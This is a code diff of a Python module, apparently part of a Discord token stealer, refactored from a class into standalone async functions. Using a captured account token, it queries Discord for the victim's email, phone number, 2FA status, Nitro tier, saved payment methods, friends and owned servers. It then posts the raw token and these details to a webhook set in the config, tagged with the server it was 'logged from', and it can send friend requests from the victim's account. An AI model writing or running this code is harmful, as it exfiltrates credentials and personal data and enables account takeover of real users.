@@ -5,111 +5,105 @@ from colorama import Fore
 from datetime import datetime
 import aiohttp
 import random
+import os
 
-class DiscordLib:
-    async def get_headers(self, token, content_type="application/json"):
-        headers = {
+async def get_headers(token, content_type="application/json"):
+    headers = {
         "Content-Type": content_type,
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
     }
-        if token:
-            headers.update({"Authorization": token})
-        return headers
-    
-    async def get_details(self, token):
-        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me", headers=await self.get_headers(token)) as resp:
-            data = await resp.json()
-            if not data['phone']:
-                data['phone'] = False
-            return data
-               
-    async def get_relationships(self, token):
-        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/relationships", headers=await self.get_headers(token)) as resp:
-            data = await resp.json()
-            return len(data)
-    
-    async def get_guilds(self, token):
-        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true", headers=await self.get_headers(token)) as resp:
-            return await resp.json()
-        
-    async def get_payment(self, token):
-        async with aiohttp.request("GET", "https://discordapp.com/api/users/@me/billing/payment-sources", headers=await self.get_headers(token)) as resp:
-            data = await resp.json()
-            if data:
-                for pm in data:
-                    if 'invalid' in pm:
-                        if pm['invalid'] == False:
-                            return True
-            return False
+    if token:
+        headers.update({"Authorization": token})
+    return headers
 
-    # async def capture_guild(self, guild):
-    #     captured_guild = {
-    #         "id": guild['id'],
-    #         "name": guild['name'],
-
-    #     }
-
-    async def capture_owned_guilds(self, guilds):
-        owned_guilds = []
-        for guild in guilds:
-            if guild["owner"]:
-                owned_guilds.append(guild)
-        return owned_guilds
-
-    async def generate_embed(self, token):
-        details = await self.get_details(token)
-
-        if "premium_type" in details:
-            if details['premium_type'] == 1:
-                nitro = "Classic"
-            elif details['premium_type'] == 2:
-                nitro = True
-        else:
-            nitro = False
+async def get_details(token):
+    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me", headers=await get_headers(token)) as resp:
+        data = await resp.json()
+        if not data['phone']:
+            data['phone'] = False
+        return data
             
-            
-        guilds = await self.get_guilds(token)
+async def get_relationships(token):
+    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/relationships", headers=await get_headers(token)) as resp:
+        data = await resp.json()
+        return len(data)
 
-        owned_guilds = await self.capture_owned_guilds(guilds)
+async def get_guilds(token):
+    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true", headers=await get_headers(token)) as resp:
+        return await resp.json()
+    
+async def get_payment(token):
+    async with aiohttp.request("GET", "https://discordapp.com/api/users/@me/billing/payment-sources", headers=await get_headers(token)) as resp:
+        data = await resp.json()
+        if data:
+            for pm in data:
+                if 'invalid' in pm: #if there is invalid a pm exists
+                    if pm['invalid'] == False: 
+                        return True
+        return False
+
+
+async def capture_owned_guilds(guilds):
+    owned_guilds = []
+    for guild in guilds:
+        if guild["owner"]:
+            owned_guilds.append(guild)
+    return owned_guilds
+
+async def generate_embed(token, logged_from):
+    details = await get_details(token)
+
+    if "premium_type" in details:
+        if details['premium_type'] == 1:
+            nitro = "Classic"
+        elif details['premium_type'] == 2:
+            nitro = True
+    else:
+        nitro = False
         
-        embed = DiscordEmbed()
-
-
-
-        embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
-        embed.add_embed_field(name='Token',         value=token, inline=False)
-        embed.add_embed_field(name='Email',         value=details['email'], inline=False)
-        embed.add_embed_field(name='Phone',         value=details['phone'], inline=False)
-        embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
-        embed.add_embed_field(name='Nitro',         value=nitro)
-        embed.add_embed_field(name='Billing',       value=await self.get_payment(token))
-        embed.add_embed_field(name='Relationships', value=await self.get_relationships(token))
-        embed.add_embed_field(name='Guilds',        value=len(guilds))
-        embed.add_embed_field(name='Owned Guilds',  value=len(owned_guilds))
-
-        for owned in owned_guilds:
-            embed.add_embed_field(name=owned['name'], value=f"{owned['approximate_member_count']} Members", inline=False)
-        return embed
-    
-    
-    async def send_webhook(self, token):
-        webhook = AsyncDiscordWebhook(url=config.config["webhook_url"])
         
-        webhook.add_embed(await self.generate_embed(token))
-        try:
-            await webhook.execute()
-        except Exception:
-            print('Failed to send webhook')
-    
-    async def send_friend_request(self, token, user):
-        payload = {
-            "username": user[0],
-            "discriminator": user[1]
+    guilds = await get_guilds(token)
 
-        }
-        headers = await self.get_headers(token)
-        async with aiohttp.request("POST", "https://discord.com/api/v9/users/@me/relationships", json=payload, headers=headers) as resp:
-            pass
+    owned_guilds = await capture_owned_guilds(guilds)
+    
+    embed = DiscordEmbed()
+
+
+
+    embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
+    embed.add_embed_field(name='Token',         value=token, inline=False)
+    embed.add_embed_field(name='Email',         value=details['email'], inline=False)
+    embed.add_embed_field(name='Phone',         value=details['phone'], inline=False)
+    embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
+    embed.add_embed_field(name='Nitro',         value=nitro)
+    embed.add_embed_field(name='Billing',       value=await get_payment(token))
+    embed.add_embed_field(name='Relationships', value=await get_relationships(token))
+    embed.add_embed_field(name='Guilds',        value=len(guilds))
+    embed.add_embed_field(name='Owned Guilds',  value=len(owned_guilds))
+
+    embed.set_footer(text=f"screen: [{config.screensess}] server: [{logged_from}]")
+    for owned in owned_guilds:
+        embed.add_embed_field(name=owned['name'], value=f"{owned['approximate_member_count']} Members", inline=False)
+    return embed
+
+
+async def send_webhook(token, logged_from):
+    webhook = AsyncDiscordWebhook(url=config.config["webhook_url"])
+    
+    webhook.add_embed(await generate_embed(token, logged_from))
+    try:
+        await webhook.execute()
+    except Exception:
+        print('Failed to send webhook')
+
+async def send_friend_request(token, user):
+    payload = {
+        "username": user[0],
+        "discriminator": user[1]
+
+    }
+    async with aiohttp.request("POST", "https://discord.com/api/v9/users/@me/relationships", json=payload, headers=await get_headers(token)) as resp:
+        pass
     
 
 
